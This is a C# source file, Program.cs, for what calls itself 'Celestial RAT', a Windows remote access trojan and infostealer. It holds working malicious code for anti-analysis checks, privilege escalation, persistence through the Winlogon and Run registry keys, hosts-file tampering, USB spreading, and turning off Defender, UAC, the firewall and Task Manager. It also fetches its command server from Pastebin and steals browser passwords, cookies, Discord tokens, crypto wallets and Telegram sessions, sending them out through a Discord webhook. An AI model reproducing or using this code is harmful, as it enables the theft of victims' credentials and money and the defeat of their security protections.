using celestialC.Helper;
using celestialC.Helper.Information;
using celestialC.Helper.Networking;
using celestialC.Stealer;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace celestialC
{
    internal static class Program
    {
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        
        public static string getRAW(string url)
        {
            WebRequest request = WebRequest.CreateHttp(url);
            WebResponse response = request.GetResponse();
            Stream receiveStream = response.GetResponseStream();
            StreamReader readStream = null;

            readStream = new StreamReader(receiveStream);

            string data = readStream.ReadToEnd();

            response.Dispose();
            readStream.Dispose();

            return data;
        }

        [STAThread]
        static private async Task Main()
        {
            if (Convert.ToBoolean(Settings.DetectDebugger) || Convert.ToBoolean(Settings.DetectSandboxie) || Convert.ToBoolean(Settings.DetectSmallDisk) || Convert.ToBoolean(Settings.DetectXP) || Convert.ToBoolean(Settings.DetectVirtualization))
                Anti_Analysis.RunAntiAnalysis();

            if (!MutexControl.CreateMutex())
                Environment.Exit(0);

            if (Convert.ToBoolean(Settings.Cblack))
            {
                string[] countrylist = Settings.Cblacklist.Split(';');
                for(int i = 0; i < countrylist.Length; i++)
                {
                    if (countrylist[i].ToLower() == ComputerInfo.GetCountry().ToLower())
                        Environment.Exit(0);
                }
            }

            if (Convert.ToBoolean(Settings.Needadm) && !Methods.IsAdmin() && !Convert.ToBoolean(Settings.isLotl))
                try
                {
                    ProcessStartInfo processStartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Verb = "runas",
                        Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = true
                    };
                    
                    Process.Start(processStartInfo);
                    Environment.Exit(0);
                }
                catch { }

            if (!Convert.ToBoolean(Settings.isLotl)) Thread.Sleep(5000);
            if(Process.GetCurrentProcess().MainModule.FileName.Contains("$CEL")) Thread.Sleep(5000);
            
            if (Methods.isRoot() && !Convert.ToBoolean(Settings.isLotl))
            {
                try
                {
                    using (
                    var registryKey =
                        Registry.CurrentUser.OpenSubKey(
                            @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
                            true))
                        if (registryKey != null)
                        {
                            registryKey.DeleteValue("Load");
                        }
                }
                catch { }

                try
                {
                    using (
                    var registryKey =
                        Registry.CurrentUser.OpenSubKey(
                            @"Software\Microsoft\Windows\CurrentVersion\Run",
                            true))
                        if (registryKey != null)
                        {
                            registryKey.DeleteValue(Settings.RegistryKeyName);
                        }
                }
                catch { }
                PipeController.sendcommand(0x2004, BitConverter.GetBytes(Process.GetCurrentProcess().Id));
                try
                {
                    if (Directory.Exists(Environment.ExpandEnvironmentVariables(Settings.InstallFolder) + "\\" + Settings.InstallSubFolder) && Process.GetCurrentProcess().MainModule.FileName.Contains("$CEL"))
                    {
                        Directory.Delete(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallSubFolder), true);
                    }
                }
                catch { }
                Settings.InstallSubFolder = "$CEL" + Settings.InstallSubFolder;
                Settings.InstallName = "$CEL" + Settings.InstallName;
                Settings.Watchdogname = "$CEL" + Settings.Watchdogname;
                string towrite = "C:\\Windows\\system32\\userinit.exe, " + Environment.ExpandEnvironmentVariables(Settings.InstallFolder) + "\\" + Settings.InstallSubFolder + "\\" + Settings.InstallName;
                try
                {
                    RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
                    if (key != null)
                    {
                        key.SetValue("Userinit", towrite, RegistryValueKind.String);
                        key.Close();
                    }
                }
                catch { }
            }
            else if(!Methods.isRoot() && !Convert.ToBoolean(Settings.isLotl))
            {
                try
                {
                    if (Directory.Exists(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), "$CEL" + Settings.InstallSubFolder)))
                    {
                        Directory.Delete(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), "$CEL" + Settings.InstallSubFolder), true);
                    }
                }
                catch { }
            } 
            
            if (!Directory.Exists(Libs.getAppPath()))
            {
                Directory.CreateDirectory(Libs.getAppPath());
                Libs.InitLibs();
            }

            if (Convert.ToBoolean(Settings.askInstall))
                if (MessageBox.Show("Celestial is a Remote Administration Tool for Windows. It allows the administrator to make changes to system remotely.You should only install this client from sources you trust.", "Install Celestial", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.No)
                   Environment.Exit(0);

            if (Convert.ToBoolean(Settings.needInstall) && !Convert.ToBoolean(Settings.isLotl))
                Install.Install.BInstall();

            try
            {
                string fileContent = File.ReadAllText(@"C:\Windows\System32\drivers\etc\hosts");
                if (Convert.ToBoolean(Settings.HostsEdit) && !fileContent.Contains("#celestial"))
                {
                    string[] hostslist = Settings.HostsList.Split(';');
                    foreach (string host in hostslist)
                    {
                        if (host != null && host.Length > 0)
                        {
                            File.AppendAllText(@"C:\Windows\System32\drivers\etc\hosts", Environment.NewLine + host.Replace('|', ' '));
                        }
                    }
                    File.AppendAllText(@"C:\Windows\System32\drivers\etc\hosts", Environment.NewLine + "#celestial");
                }
            }
            catch { }

            if (Convert.ToBoolean(Settings.usbspr) && !Convert.ToBoolean(Settings.isLotl))
                Install.Spread.USB();

            if (Convert.ToBoolean(Settings.disabletaskmgr))
                PoliciesHelper.TaskMGR(true);

            if (Convert.ToBoolean(Settings.disableregistry))
                PoliciesHelper.RegistryTools(true);

            if (Convert.ToBoolean(Settings.disablefirewall))
                PoliciesHelper.Firewall(true);

            if (Convert.ToBoolean(Settings.disableuac))
                PoliciesHelper.UAC(true);

            if (Convert.ToBoolean(Settings.disableCMD))
                PoliciesHelper.CommandPrompt(true);

            if (Convert.ToBoolean(Settings.disablewindef))
                PoliciesHelper.WindowsDefender(true);

            if (Convert.ToBoolean(Settings.DisableRun))
                PoliciesHelper.Run(true);

            if (Convert.ToBoolean(Settings.DisableWinKeys))
                PoliciesHelper.Winkeys(true);

            PluginManager.InitAll();

            if (Convert.ToBoolean(Settings.Watchdog) && Convert.ToBoolean(Settings.needInstall) && !Convert.ToBoolean(Settings.isLotl))
                Watchdog.setup();

            if (Convert.ToBoolean(Settings.isServerVar))
                Settings.isServer = true;

            if(Convert.ToBoolean(Settings.UsePastebin))
                try
                {
                    string pastedata = getRAW(Settings.PastebinLink);
                    string[] words = pastedata.Split(':');
                    Settings.DNS = words[0];
                    Settings.Port = words[1];

                    if(Settings.isServer) Settings.password = Settings.passwordvar;
                }
                catch { }
            try
            {
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                ServicePointManager.DefaultConnectionLimit = 9999;
            }
            catch { }

            if (Convert.ToBoolean(Settings.CritProcess))
                ProcessCritical.Set();

            if (Convert.ToBoolean(Settings.ARecovery))
            {
                if (Libs.LoadRemoteLibrary(Libs.ZipLib))
                {
                    if(Convert.ToBoolean(Settings.chromekill))
                    {
                        foreach (var process in Process.GetProcessesByName("Chrome"))
                        {
                            process.Kill();
                        }
                    }
                    string passwords = await Stealer.Stealer.StealEverything();
                    int seedp = Environment.TickCount;
                    string archive = Filemanager.CreateArchive(passwords, true, seedp);

                    string mssgBody = "Celestial RAT / A New log arrived.\n" 
                        + "Client time: " + ComputerInfo.datenow + "\n" 
                        + "Country: " + ComputerInfo.GetCountry() + " (" + ComputerInfo.GetPublicIP() + ")\n" 
                        + "UserName: " + Environment.UserName
                        + "\nMachineName: " + Environment.MachineName
                        + "\nGPU: " + ComputerInfo.GetGPU() 
                        + "\nCPU: " + ComputerInfo.GetCPU() 
                        + "\nRAM: " + ComputerInfo.GetRamAmount() 
                        + "\nSystem: " + ComputerInfo.GetWindowsVersion()
                        + "\nScreen: " + ComputerInfo.ScreenMetrics()
                        + "\n-------------------------------------------------"
                        + "\nPasswords : " + Stealer.Stealer.passwordsCount
                        + "\nCookies : " + Stealer.Stealer.cookiesCount
                        + "\nAutofills : " + Stealer.Stealer.fillscount
                        + "\nDiscord tokens : " + Stealer.Stealer.discordTokenCount
                        + "\nWallets : " + Stealer.Stealer.walletsCount
                        + "\nFilezilla hosts : " + Stealer.Stealer.filezillahosts
                        + "\nTelegram sessions : " + Stealer.Stealer.telegramSessionCount
                        + "\n-------------------------------------------------"
                        + "\nPassword:" + Encryption.ComputeSHA256(seedp.ToString())
                        + "\nSeed: " + seedp.ToString();
                    DiscordWebhook.SendFile(mssgBody, ComputerInfo.GetCountry() + "." + Environment.MachineName + "/" + Environment.UserName + "-" + ComputerInfo.GetPublicIP() + ".zip", "zip", archive, "");
                }
            }

            AppDomain currentDomain = AppDomain.CurrentDomain;
            currentDomain.UnhandledException += new UnhandledExceptionEventHandler(UnhandledExceptionHandling);

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());

        }

        static void UnhandledExceptionHandling(object sender, UnhandledExceptionEventArgs args)
        {
            Exception e = (Exception)args.ExceptionObject;
            List<byte> ToSendL = new List<byte>();
            ToSendL.Add(21);
            ToSendL.AddRange(Encoding.UTF8.GetBytes("Celestial Crashed! Exception: " + e.Message));
            PacketSender.Send(ToSendL.ToArray());
            Methods.ClientOnExit();
            System.Diagnostics.Process.Start(Application.ExecutablePath);

        }
    }
}
